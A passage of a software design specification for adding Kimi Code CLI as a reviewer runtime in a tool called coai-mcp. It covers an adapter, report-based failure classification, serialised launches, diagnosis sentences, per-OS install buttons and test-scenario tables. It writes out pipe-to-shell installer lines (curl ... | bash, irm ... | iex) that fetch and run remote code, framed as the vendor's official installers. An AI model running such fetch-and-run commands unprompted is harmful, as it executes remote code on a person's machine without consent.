| S3.17 `MEASURED with real Kimi 2.1.1 — the hold's lifetime` (`scripts/probe-kimi-confinement.mjs`, a new cell M-K15, 3 runs each arm; recorded in `research/RESULTS_kimi_confinement.md`, review B3) | the shipped shim with `--locks`, the owner's sign-in | arm 1: a normal answered turn; arm 2: the shim killed by its handle mid-turn (the probe's own `kill`), `kimi` left to itself | arm 1: both files `Free` within ~2 s of the shim's exit; arm 2: both `Held` while `kimi` lives, and `Free` within ~2 s of `kimi`'s own exit (EOF on its stdin) — and NOTHING else of Kimi's (a helper, an updater) holds them afterwards. **If arm 2 shows a holder after `kimi` is gone, the hold ships as a WARNING on the next launch's card, not as a gate, until the holder is named** | UNKNOWN — the measurement IS the scenario; until it is recorded decision 10 reads "unmeasured" and the hold does not gate |

**Done when** every scenario is green, the whole C# suite is green, `dotnet format --verify-no-changes` is clean, the
shim's `--help` text and `.agents/PROJECT.md` name `--home`, and no exit path returns 64.

## E4.4 — `KimiRuntime`: registered, classified from its report, serialised in the round, diagnosed, seeded

`model: opus` spec (this document) · Sonnet codes · Opus reviews.

**Goal.** A Kimi row on the server: the adapter that builds the shim's request (E4.3) through the launch control
(E4.2), reads the answer and usage from the shim's REPORT, classifies a failure from the report's structured fields and
never by scanning text, runs one Kimi launch of a round at a time, says Kimi's failures in coai's words, probes its
version without touching the person's home, and appears in the seeds. After this story a Kimi row reviews.

**Files and anchors (verified).**
- `src_mcp/runners/Reviewers/ReviewerRuntime.cs` — `IReviewerRuntime` `:318`; `ProbeVersionAsync` `:359-360`;
  `VersionWarning` `:367`; `NeedsASanitisedSnapshot` `:404`; `TakeTurnAsync` `:419-420`; `ReviewerRuntimeSelector.Default`
  `:835-836`; `RuntimeNames` `:851-855`; `MachineOnlyRuntimes` `:870-871`; `Named` `:882-896` (the `vibe` arm `:889`).
- The model to follow: `src_mcp/runners/Vibe/VibeRuntime.cs` (whole file: `Build` `:75-92`, `ProbeVersionAsync`
  `:99-111`, `HomeFor` `:149-150`, `TakeTurnAsync` `:182-183`, `VersionWarning` `:193-196`); the self-invocation shape:
  `src_mcp/runners/Reviewers/ApiRuntime.cs:75-77` (`LocalRuntime.SelfInvocation()` and the prefix) and its report reader
  `:160-182` (`ReadUsage` reads ROOT-level `tokensIn` — the ACP report nests them under `usage`, `AskAcpMode.cs:193`, so
  the reader is Kimi's own, not a reuse of `ApiRuntime.ReadUsage`); `LocalAsk.ShimDeadlineSeconds` (used by `ApiRuntime`).
- `src_mcp/runners/Reviewers/ReviewerExecutor.cs` — `RateLimit` `:247-363` (`Phrases` `:265` include `quota`, `Hit`
  `:297-298` scans stdout AND stderr, `Spent` `:318`); `Classified` `:961-990` (`RateLimit.Hit(result)` at `:963`
  decides BEFORE any adapter is asked, and its branch answers `Usage.None`); `UsageOf` `:993-994`; `LaunchAsync` /
  the turn `:872-882` (the warning carried).
- `src_mcp/runners/Reviewers/BoundedScheduler.cs:89-96` (ctor, `perProviderCap = 2` at `:91`), `:174-188` (`Limiter`),
  `:211-215` (the per-provider limiters built from `work` — the place a capability is read), `:238` (`MachineLaneAsync`),
  `:595-645` (the retry ladder and `Hopeless`).
- `src_mcp/runners/Reviewers/VendorDiagnosis.cs` — `Known` `:47` (markers → sentences), `InstallCure` `:275`, the `vibe`
  arms `:285-287`. `src_mcp/runners/Reviewers/VendorProbe.cs:216-234` (probe → `VersionWarning`).
- `src_mcp/runners/Acp/KimiAcpProfile.cs:37-54` (the shim's known failures and their names: `subscription_model`,
  `not_signed_in`, `balance_spent`), and the shim's exits `AskAcpMode.cs:37-43`.
- Seeds: `shared/feature-availability.json` — `runtimes` `:23`, the `vibe` rows at `:79-83` (`effort`), `:123-125`
  (`thinking`), `:180` (`fastMode`); generated `src_vs_code/src/featureAvailability.generated.ts`, `fastMode.generated.ts`.
- Tests that hard-code runtime lists (parent §3): `FeatureAvailabilityTests.cs:71`, `EveryAdapterRecordsWhatItLaunchedTests.cs:73`,
  `ChildEnvironmentTests.cs:33-39`; the loops over `RuntimeNames` (`VendorRuntimeSurvivesParsingTests`,
  `AnUnknownRuntimeIsRefusedByNameTests`) pick `kimi` up by themselves. The Vibe tests to mirror:
  `VibeRuntimeTests`, `AVibeReviewerRunsThroughAFakeVibeTests`, `VibeIsDiagnosedInItsOwnWordsTests`.

**BRIEF.**
1. **`src_mcp/runners/Kimi/KimiRuntime.cs`** — `public sealed class KimiRuntime(string id, HostKind host) : IReviewerRuntime`
   with the `(string id = "kimi")` overload, as `VibeRuntime`. Members:
   - `Build`: model = `settings.Model` or `KimiModels.Default` (E4.2); home = `HomeFor(settings.OwnedScratch` or
     `outputDir, Provider, role)` → `<scratch>/kh-<10 hex of sha256(provider/role)>` holding `home/` and `os/` as E4.2
     lays them out. The request: `LocalRuntime.SelfInvocation()` (prefix when no configured path — the shim is THIS
     binary; a row's `ExecutablePath` is the `kimi` path and goes to `--executable`, never replaces the shim), argv
     `[..prefix, "--ask-acp", "--profile", "kimi", "--model", model, "--cwd", worktreePath, "--home", <home>,
     "--deadline-seconds", LocalAsk.ShimDeadlineSeconds(settings.Timeout), "--executable", <absolute kimi>]`
     *[E4.2: `<home>` is the owned ROOT (`kh-*`), and `"--persons-bin", places.PersonsBin` joins the argv; the places
     come from ONE `KimiPlaces.Resolve(root, HostKinds.Current, Environment.GetEnvironmentVariable,
     SpecialFolder.UserProfile, File.Exists)` call in this adapter, and `places.Executable` is the `--executable`]* — the
     absolute `kimi` resolved HERE, in the unredirected parent (`settings.ExecutablePath` or
     `KimiAcpProfile.InstalledExecutable`), so the shim never re-derives it from a redirected profile (E4.2's trap);
     `StdIn = prompt`, `Timeout = settings.Timeout`, cwd `worktreePath`; then through `KimiLaunch.Built` (the shim's own
     hop, D19 "on both hops"). `Model: model` on the invocation. No effort, no tier (seeds say unmeasured/none).
   - `NeedsASanitisedSnapshot => true` (D6 — the round already gives `worktreePath` = the snapshot for an adapter that
     asks); `LaunchesOneAtATime => true` (step 3); `TakeTurnAsync` → `KimiLaunch.TakeAsync(host, invocation.Request,
     launcher, ct)`; `DefaultExecutable` → the SHIM is not what `providers` probes: return `KimiAcpProfile.InstalledExecutable`
     (the `kimi` CLI — what the card's version and install state are about).
   - `ProbeVersionAsync`: `kimi --version` in `KimiLaunch.Built`'s environment on a THROWAWAY owned folder made under a
     `coai-answers-` temp directory and deleted in `finally` (the `VibeRuntime.cs:99-124` shape) — NO junction and NO
     config: `kimi --version` writes nothing and needs no sign-in (§18); never the inherited environment, never the
     person's home (D19, the Vibe precedent). `VersionWarning(printed)` → E4.2's shared builder for a version outside
     `KimiAcpProfile.MeasuredVersions`, empty inside it.
   - `ReadAnswer` → the report's `answer` when `end == "answered"`, else null. `ReadUsage` → a pure
     `KimiReport.Parse(stdout)`: `usage.tokensIn/tokensOut`; `usage.notCaptured == true` or an unparseable report →
     `Usage.Unknown`; never a cost (`CostUsd = null`, D9). `WhyItFailed` → `"<failure>: <reason>"` from the report (the
     shim's `failure` name and `reason`), or the reason alone.
   - **Register**: `ReviewerRuntimeSelector.Default` (`:835-836`), `RuntimeNames` (`:851-855`, `"kimi"`), `Named`
     (`"kimi" => new Kimi.KimiRuntime(vendorId)`), `MachineOnlyRuntimes` (`:870-871`, D12 — with a remarks sentence like
     the `vibe` one).
   - *[Judge's edit, 2026-10-14, the plan round on #817:]* **the round's scratch disposes its Kimi homes junction-first**:
     `RoundScratch.Delete` (`RoundScratch.cs:69-82`) calls `KimiHome.DisposeAllUnder(Directory, _note)` (E4.2 brief §14)
     BEFORE `GitScratch.DeleteEvenIfReadOnly(Directory)`; a `Stopped` home is noted and the scratch's own delete still
     runs on the rest (the in-deleter check, E4.1 brief §2, guards it). S4.15.
2. **Classification from the report, never from text** (parent §4 S4, risk consultation `ba5f661a`). Add to
   `IReviewerRuntime` a default member `RateLimitVerdict RateLimited(ReviewerInvocation invocation, ProcessResult result)`
   whose default body is exactly today's (`RateLimit.Hit(result)` → limited with `RateLimit.Reason(result)` and
   `Usage.None`), and make `Classified` (`ReviewerExecutor.cs:961-967`) ask it instead of `RateLimit.Hit` directly — so
   every other adapter is byte-identical. `KimiRuntime` overrides: limited ONLY when the exit is 75 and the report's
   `failure` is `balance_spent` (the reason is the report's `reason`, which carries `insufficient balance`, so
   `RateLimit.Hopeless` names it spent and the ladder stops — D14); the verdict CARRIES the report's usage
   (`KimiReport.Parse`), so a spent launch keeps `notCaptured` rather than a fabricated zero. Every other exit falls
   through to the ordinary path (NonZeroExit with `WhyItFailed`), whatever text the trace holds.
3. **One Kimi launch of a round at a time** (D19, until M-K14). `IReviewerRuntime` gains `bool LaunchesOneAtATime =>
   false`. In `BoundedScheduler.RunAllAsync` (`:211-215`) the cap passed to `Limiter` is `1` for a provider whose
   invocation's adapter says `LaunchesOneAtATime`, else `perProviderCap` — one pure helper `CapFor(ReviewerWork)`,
   CC ≤ 4. The limiter is created once per provider for the scheduler's life (`:174-188`), so the first run's cap
   sticks — correct, since a provider id's runtime does not change within one server. This is the in-process half; the
   cross-process half is E4.2's gate.
4. **`VendorDiagnosis`** — `InstallCure("kimi", linux)`: Windows → `irm https://code.kimi.com/kimi-code/install.ps1 |
   iex` (and Git for Windows first, which Kimi's docs require — `winget install Git.Git`); Linux/macOS → `curl -fsSL
   https://code.kimi.com/kimi-code/install.sh | bash` (Moonshot's getting-started page, read 2026-10-14, §E4.5). `Known`
   gains the shim's three names as markers (`subscription_model:`, `not_signed_in:`, `balance_spent:` — the shim writes
   `<name>: <reason> — <cure>` on stderr, `AskAcpMode.cs:158`) mapped to sentences that keep the shim's cure; and
   `model_not_offered` (E4.3) → "the Kimi session does not offer this model — pick one the plan has". Never a phrase
   match on Kimi's own trace text.
5. **Seeds** — `shared/feature-availability.json`: `runtimes` gains `kimi`; `effort` `unmeasured` (note: `thinking` has
   `low`/`high`/`max` on the k3 models, M-K7, nothing measured it taking effect — parent §4 S4), `thinking` `unmeasured`
   (same note), `fastMode` `none`; regenerate with `node src_vs_code/scripts/generate-feature-availability.mjs` and
   commit the generated files. NOT `runtime-capabilities.json` and NOT `features.consultant` — those are S5's (a runtime
   may never enter `runtime-capabilities.json` without its own `ConfinementPlanner` arm, parent §3).
6. **Docs**: `research/module_runners.md` (`KimiRuntime`, the classification seam, `LaunchesOneAtATime`),
   `research/architecture.md` (the runtime list), README's runtime list, CHANGELOG.

**SCENARIOS** (red first; classes `KimiRuntimeTests`, `AKimiReviewerRunsThroughTheShimTests`, `KimiIsClassifiedFromItsReportTests`,
`OneKimiLaunchAtATimeTests`, `KimiIsDiagnosedInItsOwnWordsTests`).

| # | Given | When | Then | Expected red today |
|---|---|---|---|---|
| S4.1 `TheShimRequest_CarriesTheFlagsAndNeverThePrompt` | settings with a model, a 10-minute timeout, `OwnedScratch` a test folder | `Build` | argv holds `--ask-acp --profile kimi --model <id> --cwd <worktree> --home <scratch>/kh-<10 hex>/home --deadline-seconds <n> --executable <absolute>`; no argument holds the prompt or a newline; `StdIn` is the prompt; `KimiLaunch.EnvironmentRefusal(request)` is empty | (class does not exist — compile red) |
| S4.2 `KimiIsRegistered_AndMachineOnly` | — | `Default.Find("kimi")`, `Named("kimi","my-kimi")`, `RuntimeNames`, `MachineOnlyRuntimes` | found; the id is `my-kimi`; both sets hold `kimi`; the existing `RuntimeNames` loops pass; the Team server refuses a `kimi` row by name | `Find` null |
| S4.3 `AnAnsweredReport_IsTheAnswer_AndItsUsage` | a captured report: `end answered`, `answer "{…}"`, `usage {tokensIn 19973, tokensOut 31, notCaptured false}` | `ReadAnswer`, `ReadUsage` | the answer text; usage 19973/31, `CostUsd` null | — |
| S4.4 `ANotCapturedReport_IsUnknownUsage_NeverZero` | the report with `notCaptured true` (and a second case: stdout not JSON) | `ReadUsage` | `Usage.Unknown` both | — |
| S4.5 `ASpentBalance_IsOneLaunch_NamedSpent` (executor AND scheduler) | a scripted launcher answering exit 75, report `failure: balance_spent`, reason `… insufficient balance …`, `usage.notCaptured true` | one reviewer through `BoundedScheduler.RunAllAsync` | outcome `RateLimited`, `RateLimit.Hopeless(reason)` true, the launcher was called ONCE, usage unknown (not `Usage.None`) | usage `Usage.None` (the branch drops it) |
| S4.6 `ASignInRefusalWhoseTraceSaysQuota_IsNotARateLimit` | exit 77, report `failure: not_signed_in`, and the report's `reads` trace holds a path `src/quota.cs` and a tool title `check rate limit` | one reviewer through the scheduler | outcome `NonZeroExit(77)` with `not_signed_in` in its reason; ONE launch; never `RateLimited` | `RateLimited` (`Phrases` holds `quota` and `rate limit`, `ReviewerExecutor.cs:265`), retried up the ladder |
| S4.7 `ACleanSignInRefusal_IsOneLaunch` | exit 77, report `failure: not_signed_in`, no quota text | the scheduler | `NonZeroExit(77)`, one launch | (green — pins the plain case) |
| S4.8 `EveryOtherAdapter_IsClassifiedAsBefore` | a codex adapter, a stdout naming `rate limit` with exit 1 | the executor | `RateLimited`, exactly as today | (green — pins the default body of the seam) |
| S4.9 `TwoKimiReviewersOfOneRound_NeverOverlap` | three reviewers of provider `kimi` whose scripted launches each take 300 ms, and two of provider `vibe` (a fake adapter without `LaunchesOneAtATime`) | `RunAllAsync` | `PeakPerProvider["kimi"] == 1`; `PeakPerProvider["vibe"] == 2` | `PeakPerProvider["kimi"] == 2` |
| S4.10 `TheProbe_NeverTouchesThePersonsHome` | a scripted launcher recording the request | `ProbeVersionAsync` | the request's `KIMI_CODE_HOME` is a fresh folder under temp that is GONE afterwards; `InheritsEnvironment` false; `USERPROFILE` is not the parent's | the default probe: inherited environment, `Environment.CurrentDirectory` |
| S4.11 `AnUnmeasuredKimi_WarnsOnTheCard_AndTheLine` | `VersionWarning("kimi, version 2.2.0")`; a measured `2.1.1`; and one full launch through the executor with a scripted `--version` of 2.2.0 | — | the shared builder's sentence naming 2.2.0 and 2.1.1; empty for 2.1.1; the reviewer outcome's `Warning` holds the same sentence | empty (default member) |
| S4.12 `KimiIsDiagnosedInItsOwnWords` | stderr `not_signed_in: … — run \`kimi login\` …`, `subscription_model: …`, `balance_spent: …`, `model_not_offered …`; `InstallCure("kimi", true/false)` | `VendorDiagnosis` | a sentence per name that keeps the cure; the two install lines exactly as in §E4.5 | null / codex's cure |
| S4.13 `TheSeedsKnowKimi` | — | `FeatureAvailabilityTests`, the generator's `--check` | `kimi` in `runtimes`; `effort` and `thinking` `unmeasured`, `fastMode` `none`; generated TS current | missing rows |
| S4.14 `EveryAdapterRecordsWhatItLaunched` (`EveryAdapterRecordsWhatItLaunchedTests.cs:73`) | the list gains `kimi` | — | the adapter's invocation names its model | the list lacks it |
| S4.15 `TheRoundsScratch_DisposesItsKimiHomeJunctionFirst` (judge's edit, #817's plan round) | a `RoundScratch` whose directory holds `kh-0123456789/home/credentials` → a junction to the test's `persons/` (a read-only file) and a `vh-*` folder; `GitScratch.AfterUnlink` a recorder | `Dispose()` | the scratch gone; the recorder never invoked (the junction went first through `KimiHome.Dispose`); `persons/` intact; a loss arm (`KimiHome.AfterUnlink`) → `_note` holds the `Stopped` sentence | the recorder invoked |

**Done when** every scenario is green through BOTH the executor and the scheduler where the table says so, the whole
suite is green, and — the live check that unit tests cannot replace (parent §5) — one `providers` call on the owner's
machine shows the Kimi row's version and its warning, recorded in `research/module_tests.md`. The live plan and code
rounds are the parent's DoD, after E4.5.

## E4.5 — The extension row: runtime, models, preset, colour, ▶, `crossesTo`, install and update per OS

`model: opus` spec (this document) · Sonnet codes · Opus reviews.

**Goal.** In the extension, Kimi is a runtime a person adds from the catalog's preset, picks a curated model for, sees
in its own colour, opens with ▶ (plain interactive `kimi`), installs and updates with ONE press on Windows, Linux/WSL and
macOS through Moonshot's official installer — and an older `coai-mcp` never receives the row.

**The official sources — verified 2026-10-14, cited, never guessed.**
- Moonshot's getting-started page, `https://www.kimi.com/code/docs/en/kimi-code-cli/guides/getting-started`
  (`…/getting-started.html` redirects there): macOS and Linux — `curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash`;
  Windows (PowerShell) — `irm https://code.kimi.com/kimi-code/install.ps1 | iex`; npm — `npm install -g
  @moonshot-ai/kimi-code` (Node.js ≥ 22.19.0); Windows needs **Git for Windows before the first launch** (Kimi runs its
  shell through Git Bash; `KIMI_SHELL_PATH` names a custom `bash.exe`); upgrade — `kimi upgrade` or the npm line.
- The two scripts (`code.kimi.com/kimi-code/install.{ps1,sh}` → 302 → `cdn.kimi.com/kimi-code/install.{ps1,sh}`,
  read 2026-10-14): install into `%USERPROFILE%\.kimi-code\bin\kimi.exe` / `$HOME/.kimi-code/bin/kimi` (`KIMI_INSTALL_DIR`
  overrides) — the path `KimiAcpProfile.InstalledExecutableFor` already expects; download only from
  `https://code.kimi.com/kimi-code/latest`, `…/binaries/<version>/manifest.json` and `…/binaries/<version>/kimi-code-<target>.tar.gz`;
  verify SHA-256 from the manifest; put `bin` on the user `PATH` (Windows: the user `PATH`; POSIX: one rc file) unless
  `KIMI_NO_MODIFY_PATH`; **re-running installs the latest over the old one** (the old binary kept as `.bak`) — so
  re-running the script IS the update; `install.sh` refuses Windows and Alpine/musl; neither script downloads `rg`/`fd`.
- Today's latest is **2.2.0** (`https://code.kimi.com/kimi-code/latest` answers `2.2.0`; npm
  `@moonshot-ai/kimi-code` `latest` 2.2.0); the 2.1.1 manifest's `tag` is `@moonshot-ai/kimi-code@2.1.1` — the script's
  binaries and the npm package are one release line.

**Files and anchors (verified).**
- `src_vs_code/src/models.ts` — `RUNTIMES` `:35`, `CLI_RUNTIMES` `:46`, `VIBE_MODELS` `:124-127`, `VIBE_MODELS_SEEN_ON`
  `:130`, `CURATED_FOR` `:133`, `modelsFor` (`:184`, the comment at `:221`), `modelsProvenance` `:357-364`.
- `src_vs_code/src/vendors.ts:290-305` (the Vibe preset — the shape; its hint names the server version from
  `runtimeSince.ts`).
- `src_vs_code/src/vendorColour.ts:60-73` (`VENDOR_PALETTE`), `:93-100` (`ANCHORED`; used slots 0, 1, 3, 4, 6, 10).
- `src_vs_code/src/vendorTerminal.ts` — `USAGE_COMMAND` `:27-37`, `EXECUTABLE` `:40-46`, `MODEL_FLAG` `:52-58`,
  `TERMINAL_ENV` `:64-66`, `vendorUpdate` `:108-114`, `installAgain` `:128-141`, `SELF_UPDATE` `:156-160`, `PACKAGE`
  `:306-310`, `DOCS` `:313-319`, `vibeInstall`/`vibeUpdate` `:389-418` (the per-OS shape and its sourced remarks),
  `OWN_INSTALLER` `:486-489`, `OWN_UPDATE` `:492-494`.
- `src_vs_code/src/officialSources.ts:17-28` (`OFFICIAL_SOURCES`), `:57-64` (`fromOfficialSources`; `INSTALL_WORDS`
  `:49` — a step holding `upgrade` that no verb reads is REFUSED, so `kimi upgrade` would not pass this check).
- `src_vs_code/src/cliVersions.ts:25-28` (`VersionSource`), `:31-35` (`NPM_PACKAGE` — the version LIGHT's source,
  separate from the install), `:80-90` (`versionSourceFor`).
- `src_vs_code/src/runtimeSince.ts:28-34` (`VIBE_RUNTIME_SINCE`, `RUNTIME_SINCE`), `src_vs_code/src/vendorsWire.ts:113-115`
  (`crossesTo` → `runtimeOnServer`); `.release-please-manifest.json` (`src_mcp` `0.53.0` released today).
- `src_vs_code/src/panelView.ts:1187` (`KNOWS_ITS_OWN_ENDPOINT`); `src_vs_code/src/catalogWriteRules.ts:58`
  (`JUDGED_HERE`, derived from `RUNTIMES` — no edit, a test); `modelCardWorld.ts:109` and `setupTab.ts:28` read
  `CLI_RUNTIMES`; `modelCardWorld.ts:142` (`versionWarningNote` — runtime-neutral, reads `providers[].warning`).
- `src_vs_code/package.json:461` and `:993` (the two runtime enums).
- Help: `helpContent.ts`, `help.ts`, `helpRu.ts`, `helpUk.ts`, `helpDe.ts`, `helpEs.ts` (the Vibe row is the model).
- Tests to mirror and lists to extend: `src_vs_code/src/test/vibeRuntime.test.ts`, `vibeWindowsInstall.test.ts`,
  `vibeWindowsInstallRuns.test.ts`, and parent §3's hard-coded lists (`runtimeSurvives.test.ts:89`,
  `vendorTerminal.test.ts:116`, `cliVersions.test.ts:103`, `addModelGroups.test.ts:8`, `vendorColour.test.ts:108,121`,
  `featureAvailability.test.ts:64`, `capabilityAdmission.test.ts:143`, `consultant.test.ts:616`).

**BRIEF.**
1. **Runtime and enums**: `'kimi'` appended to `RUNTIMES` and `CLI_RUNTIMES`; both `package.json` enums.
2. **Models** (D10): `KIMI_MODELS` — `kimi-code/k3-256k` ("K3-256k — answered 64 paid turns in the probe"),
  `kimi-code/k3` ("K3"), `kimi-code/kimi-for-coding` ("K2.8 Preview"), `kimi-code/kimi-for-coding-highspeed` (label says
  the Kimi Code plan answers it 401 unless the plan includes it); `KIMI_MODELS_SEEN_ON = '2.1.1'`; the list EQUALS
  `KimiModels.Curated` on the server (E4.2) — a test reads both (the C# list from its source file, as other parity tests
  in this repository do, or a shared seed if E4.2 chose one). `CURATED_FOR.kimi`; `modelsProvenance.kimi`: a curated
  list; coai-mcp refuses an id outside `kimi-code/` before the launch (it would bill the person's API key) and checks the
  id against the session's own list inside the shim.
3. **Preset** (D11): `label 'Kimi Code'`, `id 'kimi'`, `runtime 'kimi'`, `model KIMI_MODELS[0].id`, `plan/code true`; the
  hint: Kimi Code on the person's Kimi Code plan, signed in as itself (`kimi login`), Windows only for now (D18), the
  `coai-mcp` version from `KIMI_RUNTIME_SINCE`, and that a Kimi row's three reviewers run one after another (D19).
4. **Colour**: `ANCHORED.kimi = 11` (`#8FA8C8`, slate — a free slot; Kimi's own mark is monochrome, so a neutral slot);
  the anchors list in `vendorColour.test.ts` gains it.
5. **Terminal ▶**: `EXECUTABLE.kimi = 'kimi'`; `MODEL_FLAG.kimi = ''` (▶ is the person's own interactive `kimi`, never
  `acp`, never a model flag nobody measured); no `TERMINAL_ENV` entry (no `KIMI_CODE_HOME`: this is the person's own
  Kimi in their own home — where `kimi login` signs coai's launches in, through the junction); `USAGE_COMMAND.kimi =
  '/usage'` (RESULTS §5: Kimi's own command, answered without a model call); `DOCS.kimi =
  'https://www.kimi.com/code/docs/en/kimi-code-cli/guides/getting-started'`.
6. **Install and update per OS** (D16; the owner's order: the buttons work on every OS). *[Judge's edit, 2026-10-14 —
   the plan round on #817 accepted: the buttons PROVISION ripgrep and fd on the side they act on, so a fresh install's
   first review never meets E4.2's tools refusal (its decision 2); the refusal stays the net.]* `kimiInstall(platform)`:
   - `win32` → ONE PowerShell line of steps in the Vibe line's shape (`vibeInstall`, `vendorTerminal.ts:389-418`; each
     step guarded, each failure STOPS the line — the `vibeWindowsInstallRuns.test.ts` (b) rule):
     `if (-not (Get-Command git -ErrorAction SilentlyContinue)) { winget install --id Git.Git -e --accept-source-agreements --accept-package-agreements; if ($LASTEXITCODE -ne 0) { return } };`
     then the same guarded step for `rg` with `--id BurntSushi.ripgrep.MSVC`, then for `fd` with `--id sharkdp.fd`, then
     `irm https://code.kimi.com/kimi-code/install.ps1 | iex`. The guards (`Get-Command rg`/`fd`/`git`) make the line
     idempotent — the Update button re-runs it and skips what is there — and keep winget's "already installed" exit
     (non-zero) from stopping the line. **The two winget packages are the projects' own, verified 2026-10-14 by
     `winget show --id <id> -e`:** `BurntSushi.ripgrep.MSVC` (15.2.0, Publisher `BurntSushi`, Publisher Url
     `https://github.com/BurntSushi`, Moniker `rg`) and `sharkdp.fd` (10.5.0, Publisher `David Peter`, Homepage
     `https://github.com/sharkdp/fd`); their `Installer Url` lines (same `winget show`, 2026-10-14) are the projects' own
     GitHub release assets, `Installer Type: portable (zip)` —
     `https://github.com/BurntSushi/ripgrep/releases/download/15.2.0/ripgrep-15.2.0-x86_64-pc-windows-msvc.zip` and
     `https://github.com/sharkdp/fd/releases/download/v10.5.0/fd-v10.5.0-x86_64-pc-windows-msvc.zip` — nobody's
     repackaging. The coder writes both into the remarks beside the sources, as the Vibe block cites Astral's; a later
     version's manifest is checked the same way before the id list is trusted again. Note for the person:
     the folder (`%USERPROFILE%\.kimi-code\bin`), that the installer puts it on the user PATH and VS Code must restart
     before ▶ (and coai-mcp's `PATH`) finds `kimi`, `rg` and `fd`, then sign in — `kimi`, then `/login` — which only the
     person can do.
   - `linux`/`darwin` → `curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash`, note: it edits one shell rc
     file, sign in the same way, and coai-mcp does not run Kimi on Linux, WSL or macOS yet (D18) — the button still
     installs Kimi there, as the owner ordered, and does NOT yet provision the tools (D18 refuses the review that would
     need them). **Written down for the day D18 lifts** (the projects' README installation sections,
     `github.com/BurntSushi/ripgrep#installation`, `github.com/sharkdp/fd#installation`, read 2026-10-14): macOS `brew
     install ripgrep fd`; Debian/Ubuntu `sudo apt-get install -y ripgrep fd-find` — where the binary is `fdfind`, and
     Kimi looks for `fd`, so the line also makes `~/.local/bin/fd` a link to it (fd's README's own instruction); Fedora
     `sudo dnf install ripgrep fd-find`; otherwise the projects' GitHub release archives. `OFFICIAL_SOURCES` would then
     need `brew install` and `apt-get install` verbs with their package lists — a change of that day, not this story's.
   `kimiUpdate` = `kimiInstall` (re-running the script installs the latest — the scripts, read 2026-10-14; the guarded
   tool steps are skipped when present); NOT `kimi upgrade`: it is documented but unmeasured here, and
   `fromOfficialSources` refuses a step saying `upgrade` that no verb reads — changing the check for one unmeasured
   command is not worth it. Register both in `OWN_INSTALLER` and `OWN_UPDATE`. Write the sources into the remarks as the
   Vibe block does.
7. **`OFFICIAL_SOURCES`** (`officialSources.ts:17-28`, `VERBS` `:42-46`, `isOfficialPackage` `:118-122`): `urls` gains
   exactly `'https://code.kimi.com/kimi-code/'` (the domain AND path — not `cdn.kimi.com`, which the command never names;
   the redirect is the publisher's). `packages` gains nothing (nothing is npm-installed). *[Judge's edit, 2026-10-14:]*
   today NO verb reads `winget install` (`unknownInstall` refuses any step holding `install`), so the Windows line of §6
   — and the Git prerequisite the first draft already had — would be refused whole. Extend the SHAPE, not the rule: a
   new list `wingetIds: ['Git.Git', 'BurntSushi.ripgrep.MSVC', 'sharkdp.fd']` beside `packages`, and a fourth `VERBS`
   entry `{ words: ['winget', 'install'], flags: ['--id', '-e', '--exact', '--accept-source-agreements',
   '--accept-package-agreements', '--silent', '-h'], spec: /^([A-Za-z0-9][A-Za-z0-9.+-]*)$/u, admitted: 'wingetIds' }`
   — `isOfficialPackage` takes the verb's `admitted` list (`packages` for npm and uv, unchanged). What stays refused by
   construction: `--source`, `-s`, `--manifest`, `--location`, `-v`/`--version`, a second id in one step, an id not in
   the list — each a way to install something other than the three publishers' packages.
8. **The update light**: `NPM_PACKAGE.kimi = '@moonshot-ai/kimi-code'` in `cliVersions.ts` — the version SOURCE only (the
   same release line as the script's binaries, see the sources above); `vendorTerminal.ts`'s `PACKAGE` stays without
   `kimi`, so the update command is the script, never npm. Correct D16's "neither is on npm" for Kimi in the remarks.
9. **`KIMI_RUNTIME_SINCE`** in `runtimeSince.ts` and its arm in `RUNTIME_SINCE`: the next MINOR after the newest released
   `src_mcp` in `.release-please-manifest.json` at the commit that lands this story — 0.53.0 is released today and S3
   (#811, a `feat`) is not; if #811 releases first, Kimi's is 0.55.0, if both ride one release 0.54.0. The remarks say
   which, and that whoever cuts the release keeps it level with the tag (the Vibe constant's rule).
10. `KNOWS_ITS_OWN_ENDPOINT` gains `'kimi'`. The card's version warning needs no code — `versionWarningNote` is
   runtime-neutral — only a test that a `kimi` row shows it.
11. **Help** in five languages (the Vibe row's shape): what the row is, Windows-only, the sign-in, serialised launches,
   the version warning; NOT "the owned home never receives code" (M-K12 (c) is unrecorded, parent D19). CHANGELOG;
   `research/module_extension.md` (the row, the per-OS install, the mixed-version limit of D13 for `kimi` beside
   `vibe`'s).

**SCENARIOS** (red first; a new `src_vs_code/src/test/kimiRuntime.test.ts` mirroring `vibeRuntime.test.ts`, and
`kimiWindowsInstall.test.ts` mirroring `vibeWindowsInstall.test.ts`).

| # | Given | When | Then | Expected red today |
|---|---|---|---|---|
| S5.1 `aKimiRowSurvivesParsing` | a saved row `{runtime:'kimi'}` | `vendorsFrom` | `runtime === 'kimi'` (not `codex`) | becomes `codex` (`vendors.ts:392`) |
| S5.2 `kimiOffersItsCuratedListAndNeverGeminis` | — | `modelsFor('kimi')` | the four ids in order; never a Gemini id; provenance names the `kimi-code/` rule | the Gemini list |
| S5.3 `theCuratedListMatchesTheServers` | the C# `KimiModels.Curated` (E4.2) | read both | equal, in order | — (no list) |
| S5.4 `thePresetRoundTrips` | the `Kimi Code` preset | added, saved, read back through `vendorsFrom` | id, runtime, model and flags intact; hint names `KIMI_RUNTIME_SINCE` | preset absent |
| S5.5 `kimiHasItsOwnColour` | `kimi` with every anchored runtime configured | colour allocation | slot 11, never shared | hashed slot |
| S5.6 `playOpensPlainKimi` | a `kimi` row with a model | `vendorTerminal` | command `kimi` (or the row's CLI path), no `acp`, no model flag, no `KIMI_CODE_HOME` in `env` | `codex -m …` (the unknown-runtime fallback, `vendorTerminal.ts:215`) |
| S5.7 `installIsMoonshotsPerOs` (judge's edit: the Windows line provisions the tools) | `kimi` on `win32`, `linux`, `darwin` | `vendorInstall` | `win32`: the one line of brief §6 — the three guarded `winget install --id <Git.Git / BurntSushi.ripgrep.MSVC / sharkdp.fd> -e …` steps, in that order, then Moonshot's `irm … \| iex`; `linux`/`darwin`: Moonshot's `curl … \| bash` alone; each `fromOfficialSources` true | the npm/codex fallback, or an unofficial line; the Windows line REFUSED by `fromOfficialSources` (no `winget` verb) |
| S5.8 `updateIsTheInstallerAgain` | the same three platforms, an installed `2.1.1` | `vendorUpdate` | the install line again (never `kimi upgrade`, never npm); `fromOfficialSources` true | `npm install -g …` or codex's |
